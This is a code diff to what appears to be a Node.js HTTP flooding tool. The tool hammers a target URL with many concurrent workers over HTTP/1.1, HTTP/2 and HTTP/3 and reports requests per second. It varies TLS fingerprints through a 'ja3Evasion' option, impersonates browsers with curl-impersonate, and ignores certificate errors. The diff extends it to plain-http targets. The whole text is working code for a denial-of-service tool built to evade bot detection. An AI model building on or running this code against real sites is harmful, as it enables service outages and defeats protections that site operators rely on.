@@ -347,6 +347,7 @@ const target = {
 };
 const targetUrl = `${target.protocol}//${target.host}:${target.port}${target.path}`;
 const targetOrigin = `${target.protocol}//${target.host}:${target.port}`;
+const isHttps = target.protocol === 'https:';
 
 const durationMs = argv.time * 60 * 1000;
 const concurrency = argv.conc;
@@ -388,25 +389,29 @@ async function runStandardWorker(workerId, protocolKey) {
     stats.connectionsOpened++;
     stats.activeWorkers++;
 
-    const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
-    const tlsVariant = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;
-
-    const connectOpts = {
-        rejectUnauthorized: false,
-        ...tlsVariant,
-    };
-
-    if (protocolKey === 'h1') {
-        connectOpts.ALPNProtocols = ['http/1.1'];
-    } else {
-
-        connectOpts.ALPNProtocols = ['h2', 'http/1.1'];
-    }
-
     const undiciOpts = {
-        connect: connectOpts,
+        connectTimeout: 15000,
+        headersTimeout: 30000,
+        bodyTimeout: 30000,
+        keepAliveTimeout: 30000,
         pipelining: protocolKey === 'h1' ? 1 : 10,
     };
+
+    if (isHttps) {
+        const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
+        const tlsVariant = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;
+        const connectOpts = {
+            rejectUnauthorized: false,
+            servername: target.host,
+            ...tlsVariant,
+        };
+        if (protocolKey === 'h1') {
+            connectOpts.ALPNProtocols = ['http/1.1'];
+        } else {
+            connectOpts.ALPNProtocols = ['h2', 'http/1.1'];
+        }
+        undiciOpts.connect = connectOpts;
+    }
 
     const client = new undiciClient(targetOrigin, undiciOpts);
     activeConnections.add(client);
@@ -519,15 +524,16 @@ async function runStandardWorker(workerId, protocolKey) {
                 const canTryH3 = impersAvailable && !inCooldown;
 
                 if (!canTryH3) {
-                    const reason = !impersAvailable ? 'impers unavailable' : `cooldown ${Math.ceil((h3CooldownUntil - now) / 1000)}s`;
-
+                    const reason = !impersAvailable
+                        ? 'impers unavailable'
+                        : `cooldown ${Math.ceil((h3CooldownUntil - now) / 1000)}s`;
                     if (Math.random() < 0.15) {
                         lastLogs.push(`[H3] ${argv.url} -> ${chalk.yellow('FALLBACK→H2')} (${reason})`);
                         if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
                     }
                     statusCode = await doUndiciRequest(headers);
-                    usedKey = 'h2';
-                    extraNote = '(fallback)';
+                    usedKey = isHttps ? 'h2' : 'h1';
+                    extraNote = isHttps ? '(fallback)' : '(fallback, no TLS)';
                 } else {
                     try {
                         const res = await doImpersH3(headers);
@@ -549,15 +555,15 @@ async function runStandardWorker(workerId, protocolKey) {
                         }
                         if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
                         statusCode = await doUndiciRequest(headers);
-                        usedKey = 'h2';
-                        extraNote = '(fallback)';
+                        usedKey = isHttps ? 'h2' : 'h1';
+                        extraNote = isHttps ? '(fallback)' : '(fallback, no TLS)';
                     }
                 }
             } else {
-
                 statusCode = await doUndiciRequest(headers);
                 usedKey = protocolKey;
-                if (FLAGS.ja3Evasion) extraNote = '[ja3]';
+                if (isHttps && FLAGS.ja3Evasion) extraNote = '[ja3]';
+                else if (!isHttps) extraNote = '[no-tls]';
             }
 
             const endTime = process.hrtime.bigint();
@@ -754,6 +760,13 @@ function updateMonitor() {
         leftColumn.push(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
         leftColumn.push(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
         leftColumn.push(chalk.white.bold('Engines: ') + chalk.green('H1/H2=undici') + chalk.gray(' | ') + chalk.green('H3=impers'));
+        leftColumn.push(
+            chalk.white.bold('JA3: ') + (
+                isHttps
+                    ? (FLAGS.ja3Evasion ? chalk.green('enabled') : chalk.gray('disabled'))
+                    : chalk.yellow('N/A on http:// (no TLS)')
+            )
+        );
         leftColumn.push(chalk.white.bold('Protocols: ') + chalk.cyan(activeProtocols.map(p => p.toUpperCase()).join(', ') || 'auto'));
 
         const rps = (stats.requestsSent / elapsedSeconds || 0).toFixed(2);
@@ -893,13 +906,23 @@ async function main() {
         console.log(chalk.cyan(`Protocol: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}`));
     }
 
+    if (attackMode === 'none' && !isHttps) {
+        console.log(chalk.yellow(
+            `Cleartext HTTP target (${targetOrigin}): JA3 is N/A (no TLS). ` +
+            `H2 cleartext (h2c) and H3 may fail or fall back — protocols still run as requested.`
+        ));
+        if (FLAGS.ja3Evasion) {
+            console.log(chalk.yellow('Flag --ja3-evasion has no effect on http:// (no ClientHello).'));
+        }
+    }
+
     if (attackMode === 'none' && (activeProtocols.includes('h3') || FLAGS.forceHttp3)) {
         await loadImpers();
         console.log(chalk.cyan(impersAvailable
             ? 'H3 engine: impers (curl-impersonate) | H1/H2 engine: undici'
             : 'H3 engine: unavailable (will FALLBACK→H2) | H1/H2 engine: undici'));
     } else if (attackMode === 'none') {
-        console.log(chalk.cyan('H1/H2 engine: undici (native)'));
+        console.log(chalk.cyan(isHttps ? 'H1/H2 engine: undici (native TLS)' : 'H1 engine: undici (cleartext HTTP)'));
     }
 
     if (attackMode === 'none') {
